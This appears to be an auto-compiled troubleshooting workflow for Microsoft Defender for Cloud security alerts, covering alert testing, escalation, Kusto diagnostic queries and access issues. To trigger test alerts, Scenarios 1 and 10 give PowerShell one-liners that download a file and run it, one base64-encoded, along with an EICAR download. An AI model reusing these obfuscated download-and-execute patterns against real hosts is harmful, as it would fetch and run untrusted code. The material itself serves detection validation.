# Defender MDC 安全警报 — 排查工作流

**来源草稿**: ado-wiki-a-manually-trigger-alerts.md, ado-wiki-a-r3-security-alerts-escalation-procedure.md, ado-wiki-a-r3-security-alerts-tsgs-directory.md, ado-wiki-b-eicar-alerts-test.md, ado-wiki-b-r1-general-security-alert-investigation.md, ado-wiki-b-r1-sample-alerts-tsg.md, ado-wiki-b-security-alert-testing.md, ado-wiki-b-security-alerts-boundaries.md, ado-wiki-b-xdr-users-unable-to-access-alerts.md, mslearn-defender-alert-validation-simulation.md, onenote-alerts-not-triggered-tsg.md
**场景数**: 11
**生成日期**: 2026-04-07

---

## Scenario 1: Overview (Manually Trigger Alerts)
> 来源: ado-wiki-a-manually-trigger-alerts.md | 适用: Mooncake ⚠️ 未明确

### 排查步骤
1. Copy an executable (e.g. notepad.exe) into a file named `genhash.exe`
2. Execute the program (note that it might not load)
3. After a few minutes, you will receive a **HIGH severity** alert "Suspicious process executed"

### 脚本命令
```powershell
powershell.exe -enc UG93ZXJTaGVsbCAtRXhlY3V0aW9uUG9saWN5IGJ5cGFzcyAtbm9wcm9maWxlIC1jb21tYW5kIChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZpbGUoImh0dHA6Ly84LjguOC44L25vZmlsZSIsICIkZW52OlRNUFxpc25vdGFiYWRmaWxlLmV4ZSIgKTsgU3RhcnQtUHJvY2VzcygiJGVudjpUTVBcaXNub3RhYmFkZmlsZS5leGUiKQ==
```

```powershell
PowerShell -ExecutionPolicy bypass -noprofile -command (New-Object System.Net.WebClient).DownloadFile("http://8.8.8.8/nofile", "$env:TMP\isnotabadfile.exe" ); Start-Process("$env:TMP\isnotabadfile.exe")
```

---

## Scenario 2: Alerts escalation procedure
> 来源: ado-wiki-a-r3-security-alerts-escalation-procedure.md | 适用: Mooncake ⚠️ 未明确

### 排查步骤
1. If ProviderSendAlertTimeUtc already contains most latency from StartTimeUtc/EndTimeUtc, open Customer Reported Incident directly on provider Incident Case Management group  Alerts Providers List, which includes this query and results.
2. ProviderSendAlertTimeUtc does not contain the latency - open Customer Reported Incident directly on alert platform team (Detection Team) which includes this query and results.

### Portal 导航路径
- Customer Reported Incident directly on provider Incident Case Management group  [Alerts Providers List](https://msazure
- Customer Reported Incident directly on alert platform team (Detection Team) which includes this query and results

### Kusto 诊断查询
**查询 1:**
```kusto
cluster('romeeus.eastus.kusto.windows.net').database('ProdAlerts').AllSecurityAlerts
| where SystemAlertId =='' // replace with systemAlertId
| project StartTimeUtc, EndTimeUtc, ProviderSendAlertTimeUtc=Metadata['DetectionInternalAlertsProcessing.PipelineReceiveTime'], ProviderName
```

---

## Scenario 3: Container Security - Defender for Containers - TSGs
> 来源: ado-wiki-a-r3-security-alerts-tsgs-directory.md | 适用: Mooncake ⚠️ 未明确

---

## Scenario 4: EICAR Alerts Test - Multi-Platform Validation
> 来源: ado-wiki-b-eicar-alerts-test.md | 适用: Mooncake ⚠️ 未明确

### 排查步骤
1. Copy an executable (e.g., calc.exe) to the desktop and rename it as **Alert Test 662jfi039N.exe**
2. Open command prompt and execute: `Alert Test 662jfi039N.exe -foo`
3. Wait 5-10 minutes and check Security Center Alerts
4. Copy an executable and rename: `cp /bin/echo ./alerttest_662jfi039n`
5. Execute: `./alerttest_662jfi039n testing eicar pipe`
6. Wait 5-10 minutes and check Security Center Alerts
7. Connect to cluster: `az aks get-credentials --resource-group myResourceGroup --name myAKSCluster`
8. Run: `kubectl get pods --namespace=alerttest-662jfi039n`
9. Validate test alert appears in Defender for Cloud alert blade
10. Create a new Storage Account, go to Blob Service > Containers
11. Create new container named **storageatpvalidation** (private access)
12. Download Storage Explorer
13. Create a text file with the EICAR test string:
14. Save as `EICAR.com`
15. Open Storage Explorer, add Azure account
16. Navigate to the container and upload the EICAR file
17. Wait for alert to appear

### Portal 导航路径
- command prompt and execute: `Alert Test 662jfi039N
- Blob Service > Containers
- Storage Explorer, add Azure account
- the container and upload the EICAR file

---

## Scenario 5: General Security Alert Investigation — TSG
> 来源: ado-wiki-b-r1-general-security-alert-investigation.md | 适用: Mooncake ⚠️ 未明确

### Kusto 诊断查询
**查询 1:**
```kusto
cluster("Rome.kusto.windows.net").database("ProdAlerts").SecurityAlertsFromAllRegions('{subscriptionId}', now(-61d), now())
```

**查询 2:**
```kusto
database("ProdAlerts").SecurityAlerts
| where Metadata["StoreManager.EffectiveSubscriptionId"] == "{subscriptionId}"
| where Metadata["StoreManager.Published"] == "True"
| where ExtendedProperties["Source IP(s) [#attempts]"] contains "X.X.X.X"
| where AlertDisplayName == "Detected suspicious network activity"
| where Severity != "Silent"
| where StartTimeUtc > ago(31d)
| extend Description = tostring(ExtendedProperties["AnalyticDescription"])
| extend CompromisedHost = tostring(ExtendedProperties["Compromised Host"])
| extend ResourceType = tostring(ExtendedProperties["resourceType"])
| project StartTimeUtc, EndTimeUtc, AlertDisplayName, Description, IsIncident, CompromisedEntity, AlertType, Severity, ProviderName, VendorName, WorkspaceResourceGroup, Metadata, ExtendedProperties, IngestorMetadata, TimeGeneratedUtc, Entities
| sort by StartTimeUtc desc
```

**查询 3:**
```kusto
let lookBackTime = 10d;
let mdcSystemAlertId = "2517173970497622265_8e9e509b-7cad-4c6a-aec4-605ddc54e180";
cluster('https://rome.kusto.windows.net').database("DetectionLogs").ServiceFabricDynamicOE
| where env_time > ago(lookBackTime)
| where serviceName == "fabric:/ResourceProviderApp/ResourceProviderAppService"
| where env_cloud_environment =~ 'prod'
| where operationName contains "InnerPartnerAlertsUpdateAsync"
| where tostring(customData["alertList"]) contains mdcSystemAlertId
| extend RpLocation = "CUS"
| union (
    cluster('https://romeuksouth.uksouth.kusto.windows.net').database("DetectionLogs").ServiceFabricDynamicOE
    | where env_time > ago(lookBackTime)
    | where serviceName == "fabric:/ResourceProviderApp/ResourceProviderAppService"
    | where env_cloud_environment =~ 'prod'
    | where operationName contains "InnerPartnerAlertsUpdateAsync"
    | extend customData = todynamic(customData)
    | where tostring(customData["alertList"]) contains mdcSystemAlertId
    | extend RpLocation = "EU"
)
| extend updateOrigin = iff(customData["isM365Update"] == "true", "M365D", "sentinel")
| project env_time, updateOrigin, RpLocation, updatedAlerts = customData["alertList"], isUpdateSuccessful = customData["getUpdateActionIsSuccess"], incomingNewStatus = customData["Status"], MDCnewStatus = customData["alertNewStateReadable"]
```

**查询 4:**
```kusto
let subs = cluster('rometelemetrydata').database("RomeTelemetryProd").GetDimSubscription()
| where SubscriptionStatus == "ACTIVE";
cluster('aznwsdn').database('aznwmds').VipOwnershipSnapshotEvent
| where TIMESTAMP >= datetime(2024-11-06 00:00:00.0)
| where TIMESTAMP <= datetime(2024-11-06 23:59:59.0)
| where IPAddress == "0.0.0.0"
| join kind=inner subs on SubscriptionId
| project IPAddress, SubscriptionId, FriendlySubscriptionName, CustomerName, SubscriptionStatus, IsExternalSubscription, FirstPartyUsage, Accessibility, CloudCustomerDisplayName, IsFraud, OfferName
```

**查询 5:**
```kusto
union
cluster('https://romeuksouth.uksouth.kusto.windows.net').database('ProdAlerts').SecurityAlerts,
cluster('https://romeeus.eastus.kusto.windows.net').database('ProdAlerts').SecurityAlerts
| where StartTimeUtc >= ago(10d)
| where AlertDisplayName == "{AlertDisplayName}"
| distinct AlertDisplayName, RequiredPlan = tostring(Metadata["DetectionInternalAlertsProcessing.RequiredPricingPlans"])
```

---

## Scenario 6: Sample Alerts in Microsoft Defender for Cloud — TSG
> 来源: ado-wiki-b-r1-sample-alerts-tsg.md | 适用: Mooncake ⚠️ 未明确

### 排查步骤
1. Customer initiates alert generation in UI
2. Request moves to Alerts RP → Pipeline Processing
3. Simulated alerts created and stored in Azure Resource Graph (ARG)
4. Alerts displayed in UI from ARG
5. REST Client sends simulate alerts POST request
6. Request moves to Alerts RP → Pipeline Processing
7. Simulated alerts created and stored in Security Alerts Table
8. Alerts retrieved via get alerts request

### Kusto 诊断查询
**查询 1:**
```kusto
securityresources
| where type == "microsoft.security/locations/alerts"
| where properties.AlertType startswith "SIMULATED"
```

**查询 2:**
```kusto
securityresources
| where type == "microsoft.security/locations/alerts"
| where id startswith "/subscriptions/{subscriptionId}"
| where properties.AlertType startswith "SIMULATED"
```

**查询 3:**
```kusto
// Execute on: https://armprodgbl.eastus.kusto.windows.net/ARMProd
macro-expand isfuzzy=true ARMProdEG as X
(
    X.database('Requests').HttpOutgoingRequests
    | where TIMESTAMP > ago(1d)
)
| where operationName == "POST/VERSIONS/SUBSCRIPTIONS/PROVIDERS/MICROSOFT.SECURITY/LOCATIONS/ALERTS/SIMULATE"
| where hostName == "cus.rp.alerts.security.azure.com"
| where subscriptionId == "<subscriptionId>"
| project PreciseTimeStamp, TaskName, correlationId
```

---

## Scenario 7: Alert Testing and Validation
> 来源: ado-wiki-b-security-alert-testing.md | 适用: Mooncake ⚠️ 未明确

### 排查步骤
1. Load your subscription
2. Change view to "Resource Provider"
3. Go to Microsoft.OperationalInsights
4. Select your workspace under "Workspace"
5. Switch to "Query Customer Data" tab
6. Run query from "Kusto query tab":

### Kusto 诊断查询
**查询 1:**
```kusto
cluster('RomeEUS.eastus.kusto.windows.net').database('ProdAlerts').AllSecurityAlerts()
| where StartTimeUtc > ago(14d)
| extend ProcessingLatency = todatetime(ProcessingEndTime) - TimeGeneratedUtc
| extend TimeFromEvent = todatetime(ProcessingEndTime) - EndTimeUtc
| where TimeFromEvent > time(0) and ProcessingLatency > time(0)
| project Severity, CompromisedEntity, ProviderName, AlertType, StartTimeUtc, TimeGeneratedUtc, ProcessingLatency, TimeFromEvent, ingestion_time()
| summarize count(), avg(ProcessingLatency), percentiles(ProcessingLatency, 50, 90, 95, 99) by ProviderName
```

**查询 2:**
```kusto
cluster('RomeEUS.eastus.kusto.windows.net').database('ProdAlerts').AllSecurityAlerts()
| where StartTimeUtc > ago(14d)
| extend ProcessingLatency = todatetime(ProcessingEndTime) - TimeGeneratedUtc
| extend TimeFromEvent = todatetime(ProcessingEndTime) - EndTimeUtc
| where TimeFromEvent > time(0) and ProcessingLatency > time(0)
| project Severity, CompromisedEntity, ProviderName, AlertType, StartTimeUtc, TimeGeneratedUtc, ProcessingLatency, TimeFromEvent
| summarize count(), avg(TimeFromEvent), percentiles(TimeFromEvent, 50, 90, 95, 99) by ProviderName
```

**查询 3:**
```kusto
cluster('RomeEUS.eastus.kusto.windows.net').database('ProdAlerts').AllSecurityAlerts()
```

**查询 4:**
```kusto
cluster('RomeEUS.eastus.kusto.windows.net').database('ProdAlerts').AllSecurityAlerts() 
| where AzureResourceSubscriptionId == '{subscriptionId}'
| where StartTimeUtc > startofmonth(now())
| project TimeGeneratedUtc, StartTimeUtc, EndTimeUtc, Status, AlertDisplayName,
  ProviderAlertId, SystemAlertId, AlertType, Severity,
  ProviderName, CompromisedEntity,
  Metadata, ExtendedProperties,
  Intent, Entities,
  ProductName, VendorName, Description, RemediationSteps,
  AzureResourceId, WorkspaceId
```

**查询 5:**
```kusto
SecurityAlert 
| where TimeGenerated > now(-90d)
```

---

## Scenario 8: [Boundaries] Microsoft Defender for Cloud Alerts
> 来源: ado-wiki-b-security-alerts-boundaries.md | 适用: Mooncake ⚠️ 未明确

### Portal 导航路径
- a ticket with the Microsoft Security Response Team (CERT)

### 决策树
> ⚠️ 本场景包含条件分支判断，请参考来源草稿获取完整决策逻辑。

---

## Scenario 9: XDR Users Unable to Access Specific Alerts Originating From Microsoft Sentinel
> 来源: ado-wiki-b-xdr-users-unable-to-access-alerts.md | 适用: Mooncake ⚠️ 未明确

### 排查步骤
1. Open browser DevTools > Network tab
2. Enable **Preserve log**
3. **Enable Disable cache** (if not enabled, TenantContext frame may not appear)
4. Start recording
5. Have the customer attempt to open the problematic alert
6. Save the HAR and share it
7. Sign out and back in
8. Optionally capture another HAR
9. Verify the alert opens

### Portal 导航路径
- specific alerts** in the M365 Defender/XDR portal
- and others fail
- browser DevTools > Network tab
- the problematic alert

### Kusto 诊断查询
**查询 1:**
```kusto
cluster('wcdscrubbeduks.uksouth').database('scrubbeddata').MtpAlerts
| where EventTime >= ago(1d)
| where AlertId == '<ALERT_ID>'
| project OrgId, AlertId, AlertTitle, AlertProduct, Products, Sentinel_Workspace
```

**查询 2:**
```kusto
cluster('wcdprod.kusto.windows.net').database('Geneva').InETraceEvent
| where env_time > ago(7d)
| where service_name == "ine-alertsapiservice"
| where Message startswith "LogUserScopesData_SecurityData.Read"
| where AadUserId == '<USER_OBJECT_ID>'
| project Message
| take 20
```

**查询 3:**
```kusto
cluster('wcdscrubbeduks.uksouth').database('scrubbeddata').MtpAlerts
| where EventTime >= ago(1d)
| where AlertId == '<ALERT_ID>'
  and OrgId == '<ORG_ID>'
| project Sentinel_Workspace
```

---

## Scenario 10: Defender for Cloud Alert Validation & Simulation Guide
> 来源: mslearn-defender-alert-validation-simulation.md | 适用: Mooncake ✅

### 排查步骤
1. From security alerts page toolbar → **Sample alerts**
2. Select subscription
3. Select relevant Defender plan(s)
4. Click **Create sample alerts**
5. Alerts appear in ~10 minutes in Alerts blade + connected SIEMs/email
6. Requires MDE agent installed (Defender for Servers integration)
7. Open elevated Command Prompt
8. Run: `powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\test-MDATP-test\invoice.exe');Start-Process 'C:\test-MDATP-test\invoice.exe'`
9. Alert appears in ~10 minutes
10. **Prerequisite**: Defender for Endpoint Real-Time protection must be enabled
11. MDE agent required
12. Run: `curl -O https://secure.eicar.org/eicar.com.txt`
13. Alert appears in ~10 minutes
14. Real-Time protection must be enabled
15. Create or use existing website (wait 24h for new sites)
16. Access: `https://<website>.azurewebsites.net/This_Will_Generate_ASC_Alert`
17. Alert generated in 2-4 hours
18. Navigate to storage account with Defender for Storage enabled
19. Upload a file to a container
20. Generate SAS URL for the uploaded file

### Portal 导航路径
- elevated Command Prompt
- storage account with Defender for Storage enabled

---

## Scenario 11: TSG: MDC Alerts Not Triggered or Delayed
> 来源: onenote-alerts-not-triggered-tsg.md | 适用: Mooncake ✅

### 排查步骤
1. Defender plan not enabled for the resource type
2. OMS agent outdated or not reporting
3. Security event collection not configured (missing EnableAscPolicies)
4. ODS injection failures
5. Scuba detection engine issues
6. Rome alert suppression

---
